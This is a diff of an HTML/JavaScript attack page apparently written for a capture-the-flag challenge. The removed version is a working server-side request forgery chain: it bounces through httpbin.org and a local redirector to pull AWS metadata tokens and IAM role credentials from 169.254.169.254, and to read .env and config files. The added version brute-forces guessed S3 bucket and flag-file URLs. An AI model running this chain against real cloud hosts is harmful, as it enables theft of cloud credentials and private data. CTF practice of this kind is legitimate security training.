@@ -1,107 +1,86 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Focused AWS Token Attack</title>
+    <title>Direct S3 Bucket Access</title>
 </head>
 <body>
-    <h1>🎯 Focused AWS Metadata Attack - Token Chain</h1>
+    <h1>🪣 Direct S3 Bucket Access Test</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Step 1: Get the 12-byte token response we saw earlier
-        try {
-            results += "<h2>🔐 Step 1: Extract AWS Metadata Token</h2>";
-            var xhr1 = new XMLHttpRequest();
-            var tokenUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token';
-            xhr1.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenUrl), false);
-            xhr1.send();
-            
-            var token = xhr1.responseText.trim();
-            results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ Token Response: " + xhr1.responseText.length + " bytes</div>";
-            results += "<div style='background:#fff3cd;padding:10px;border:1px solid orange;'>🔑 Token Content: <code>" + token + "</code></div>";
-            
-            // Step 2: If we got a token, use it to access metadata
-            if(token && token.length > 5) {
-                results += "<h2>🎯 Step 2: Use Token to Access AWS Credentials</h2>";
-                
-                // Try to access IAM security credentials with the token
-                var credUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-                var xhr2 = new XMLHttpRequest();
-                xhr2.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(credUrl), false);
-                // Note: We can't set custom headers through this chain, so this might still fail
-                xhr2.send();
-                
-                results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>📋 IAM Roles Response: " + xhr2.responseText.length + " bytes</div>";
-                results += "<div style='background:#f0f0f0;padding:10px;'>" + xhr2.responseText + "</div>";
-                
-                // If we get a role name, try to access its credentials
-                var roleName = xhr2.responseText.trim();
-                if(roleName && roleName.length > 0 && !roleName.includes('401') && !roleName.includes('Unauthorized')) {
-                    var roleCredUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' + roleName;
-                    var xhr3 = new XMLHttpRequest();
-                    xhr3.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(roleCredUrl), false);
-                    xhr3.send();
-                    
-                    results += "<div style='background:#ff6b6b;color:white;padding:15px;border:3px solid red;'>🚨 ROLE CREDENTIALS ATTEMPT 🚨</div>";
-                    results += "<div style='background:#f0f0f0;padding:10px;white-space:pre-wrap;'>" + xhr3.responseText + "</div>";
-                }
-            }
-            
-        } catch(e) {
-            results += "<div style='background:#ffe8e8;padding:10px;'>❌ Error: " + e.message + "</div>";
-        }
+        // Try to access S3 buckets directly (some might be public)
+        results += "<h2>🎯 Direct S3 Bucket Enumeration</h2>";
+        results += "<p>Based on original writeup: S3 bucket 'secretdocs' with 'leviathan.txt'</p>";
         
-        // Step 3: Try alternative credential sources via the working chain
-        results += "<h2>🔍 Step 3: Alternative Credential Sources</h2>";
-        
-        var altSources = [
-            // AWS User Data (often contains credentials)
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
+        var s3Tests = [
+            // Original writeup S3 bucket
+            { url: 'https://secretdocs.s3.amazonaws.com/', desc: 'secretdocs bucket (original writeup)' },
+            { url: 'https://secretdocs.s3.amazonaws.com/leviathan.txt', desc: 'leviathan.txt (original flag file)' },
+            { url: 'http://secretdocs.s3.amazonaws.com/', desc: 'secretdocs HTTP' },
+            { url: 'http://secretdocs.s3.amazonaws.com/leviathan.txt', desc: 'leviathan.txt HTTP' },
             
-            // Try accessing older AWS metadata versions (might not need tokens)
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/',
+            // Common S3 bucket names for CTFs
+            { url: 'https://flag.s3.amazonaws.com/', desc: 'flag bucket' },
+            { url: 'https://flags.s3.amazonaws.com/', desc: 'flags bucket' },
+            { url: 'https://ctf.s3.amazonaws.com/', desc: 'ctf bucket' },
+            { url: 'https://challenge.s3.amazonaws.com/', desc: 'challenge bucket' },
+            { url: 'https://tenable.s3.amazonaws.com/', desc: 'tenable bucket' },
+            { url: 'https://tenablecs.s3.amazonaws.com/', desc: 'tenablecs bucket' },
+            { url: 'https://tenablecstools.s3.amazonaws.com/', desc: 'tenablecstools bucket' },
+            { url: 'https://hacking-tools.s3.amazonaws.com/', desc: 'hacking-tools bucket' },
+            { url: 'https://hackingtools.s3.amazonaws.com/', desc: 'hackingtools bucket' },
             
-            // Try known role names directly
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+            // Try different file names
+            { url: 'https://secretdocs.s3.amazonaws.com/flag.txt', desc: 'flag.txt in secretdocs' },
+            { url: 'https://secretdocs.s3.amazonaws.com/flag', desc: 'flag in secretdocs' },
+            { url: 'https://secretdocs.s3.amazonaws.com/secret.txt', desc: 'secret.txt in secretdocs' },
             
-            // Local credential files via internal redirector
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/.env',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/config.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/credentials',
+            // Different regions
+            { url: 'https://secretdocs.s3.us-east-1.amazonaws.com/', desc: 'secretdocs us-east-1' },
+            { url: 'https://secretdocs.s3.us-east-1.amazonaws.com/leviathan.txt', desc: 'leviathan.txt us-east-1' },
+            { url: 'https://secretdocs.s3-us-east-1.amazonaws.com/', desc: 'secretdocs s3-us-east-1' },
+            { url: 'https://secretdocs.s3-us-east-1.amazonaws.com/leviathan.txt', desc: 'leviathan.txt s3-us-east-1' },
         ];
         
-        for(var i = 0; i < altSources.length; i++) {
+        for(var i = 0; i < s3Tests.length; i++) {
             try {
-                results += "<h4>🔍 " + (i+1) + ": " + altSources[i].split('127.0.0.1/redir.php?url=')[1] + "</h4>";
+                var test = s3Tests[i];
+                results += "<h3>🪣 " + (i+1) + ": " + test.desc + "</h3>";
+                results += "<div style='font-size:11px;color:#666;margin-bottom:5px;'>" + test.url + "</div>";
+                
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(altSources[i]), false);
+                xhr.open('GET', test.url, false);
                 xhr.send();
                 
-                if(xhr.responseText && xhr.responseText.trim().length > 5) {
-                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>✅ " + xhr.responseText.length + " bytes</div>";
+                if(xhr.responseText && xhr.responseText.trim().length > 0) {
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ ACCESSIBLE: " + xhr.responseText.length + " bytes</div>";
                     
+                    // Check for flag content
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
-                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🎉🎉🎉 AWS CREDENTIALS FOUND! 🎉🎉🎉</div>";
+                    if(text.includes('flag{') || text.includes('ctf{') || text.includes('}')) {
+                        results += "<div style='background:#ff0000;color:white;padding:20px;border:5px solid red;text-align:center;font-size:18px;'>🎉🎉🎉 FLAG FOUND! 🎉🎉🎉</div>";
                     }
-                    if(text.includes('asia') && text.includes('secret')) {
-                        results += "<div style='background:#ff4500;color:white;padding:10px;'>🔑 AWS ACCESS KEY PATTERN!</div>";
+                    if(text.includes('leviathan') || text.includes('secret') || text.includes('no sound, once made')) {
+                        results += "<div style='background:#32cd32;color:white;padding:15px;border:3px solid green;'>🎯 ORIGINAL WRITEUP CONTENT DETECTED!</div>";
                     }
-                    if(!text.includes('401') && !text.includes('unauthorized') && !text.includes('not found')) {
-                        results += "<div style='background:#90ee90;padding:8px;'>✅ Successful Access!</div>";
+                    if(text.includes('<listbucketresult') || text.includes('<contents>')) {
+                        results += "<div style='background:#74c0fc;padding:10px;'>📂 S3 BUCKET LISTING!</div>";
+                    }
+                    if(text.includes('access denied') || text.includes('403')) {
+                        results += "<div style='background:#ffcccb;padding:8px;'>🚫 Access Denied</div>";
+                    }
+                    if(text.includes('no such bucket') || text.includes('404')) {
+                        results += "<div style='background:#ffeaa7;padding:8px;'>❌ Bucket Not Found</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:8px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                 } else {
                     results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:3px;'>❌ Failed</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 60) + "</div>";
             }
         }
         
